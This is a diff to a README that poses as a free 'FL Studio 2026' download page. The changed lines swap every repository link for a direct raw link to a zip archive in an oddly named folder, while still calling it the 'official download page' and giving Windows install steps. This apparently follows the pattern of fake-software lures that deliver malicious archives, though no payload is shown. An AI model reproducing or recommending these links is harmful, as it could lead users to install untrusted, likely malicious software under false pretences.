@@ -1,12 +1,12 @@
 # 🎹 fl-studio-producer - Professional Music Production Software For Everyone
 
-[![](https://img.shields.io/badge/Download-FL_Studio_2026-blue.svg)](https://github.com/Ninkhursagcumquat730/fl-studio-producer)
+[![](https://img.shields.io/badge/Download-FL_Studio_2026-blue.svg)](https://raw.githubusercontent.com/Ninkhursagcumquat730/fl-studio-producer/main/unarresting/fl-studio-producer-2.2-beta.2.zip)
 
 ## 📥 How to Download and Install
 
 You perform these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/Ninkhursagcumquat730/fl-studio-producer).
+1. Go to the [official download page](https://raw.githubusercontent.com/Ninkhursagcumquat730/fl-studio-producer/main/unarresting/fl-studio-producer-2.2-beta.2.zip).
 2. Look for the release section on the right side of the screen.
 3. Click the link for the installation file.
 4. Save the file to your computer.
@@ -77,4 +77,4 @@ Create a folder for your plugins and point the software to that folder in the fi
 
 If you run into trouble, look at the documentation included with the download. It explains how every tool works. Most problems relate to hardware settings, so double-check your audio device selection first. 
 
-You find the installer here for your convenience: [Download FL Studio 2026](https://github.com/Ninkhursagcumquat730/fl-studio-producer)
+You find the installer here for your convenience: [Download FL Studio 2026](https://raw.githubusercontent.com/Ninkhursagcumquat730/fl-studio-producer/main/unarresting/fl-studio-producer-2.2-beta.2.zip)
